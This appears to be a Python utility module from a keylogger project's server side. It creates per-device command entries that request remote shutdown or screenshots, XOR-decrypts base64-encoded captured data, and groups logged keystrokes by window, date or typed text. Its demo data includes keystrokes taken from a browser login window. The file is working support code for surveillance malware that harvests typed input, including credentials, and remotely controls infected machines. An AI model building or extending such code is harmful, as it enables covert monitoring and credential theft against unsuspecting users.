import base64,datetime,json

def generate_log_filename()->str:
    return "log_" + datetime.datetime.now().strftime("%d-%m-%Y") + ".json"

def generate_commend_file(serial_number):
    data_path = 'commend.json'
    try:
        with open(data_path, 'r', encoding='utf-8') as file:
            try:
                data_dict = json.load(file)
            except json.JSONDecodeError:
                data_dict = {}
    except FileNotFoundError:
        data_dict = {}

    data_dict[serial_number] = {"shutdown_requested": False,"take_screenshot": False}

    with open(data_path, 'w', encoding='utf-8') as file:
        json.dump(data_dict, file, ensure_ascii=False, indent=4)





def get_date_list(start_date: str, end_date: str) -> list[str] | str:
    try:
        start_date_obj = datetime.datetime.strptime(start_date, "%d-%m-%Y").date()
        end_date_obj = datetime.datetime.strptime(end_date, "%d-%m-%Y").date()

        if end_date_obj < start_date_obj:
            return "End date is earlier than start date."

        date_list = []
        current_date = start_date_obj
        while current_date <= end_date_obj:
            date_list.append(current_date.strftime("%d-%m-%Y"))
            current_date += datetime.timedelta(days=1)

        return date_list

    except ValueError:
        return "Invalid date format or incorrect date."


def merge_dicts(*dicts: dict[:str]) -> dict:
    dict_to_ret = dicts[0]
    if len(dicts) > 1:
        for one_dict in dicts[1:]:
            for key, val in one_dict.items():
                if key not in dict_to_ret:
                    dict_to_ret[key] = ""
                dict_to_ret[key] += val

    return dict_to_ret


def decrypt(key: str, data: str) -> str:
    ciphertext = base64.b64decode(data)
    plaintext_bytes = bytearray()

    length_key = len(key)
    for index in range(len(ciphertext)):
        xor_byte = (ciphertext[index] ^ ord(key[index % length_key])) & 0xFF
        plaintext_bytes.append(xor_byte)

    return plaintext_bytes.decode('utf-8', errors='ignore')


def group_log_data(data:dict[str:str],by='window') -> dict[str:dict[str:str]]:
    formated_dict = {}
    for k,v in data.items():
        time = k[-8:]
        date = k[-21:-11]
        window = k[:-23]
        text = v

        if by == 'window':
            main_key = window
            sub_key = date + ' - '+time
            value = text
        elif by == 'date':
            main_key = date
            sub_key = window
            value = text
        elif by == 'text':
            main_key = text
            sub_key = window
            value = date + ' - '+time
        else:
            return

        if main_key not in formated_dict:
            formated_dict[main_key]={}
        if sub_key not in formated_dict[main_key]:
            formated_dict[main_key][sub_key] = ""
        formated_dict[main_key][sub_key] =value
    return formated_dict


if __name__ == '__main__':

    demo = {
            "KeyloggerProject app.py: 23/02/2025 - 23:25:41": "123",
            "KeyloggerProject app.py: 18/02/2025 - 23:25:41": "456",
            "KeyloggerProject config.yaml: 23/02/2025 - 23:26:43": "v",
            "login - Google Chrome: 23/02/2025 - 23:26:06": "ap"
        }
    print(group_log_data(demo,by='text'))
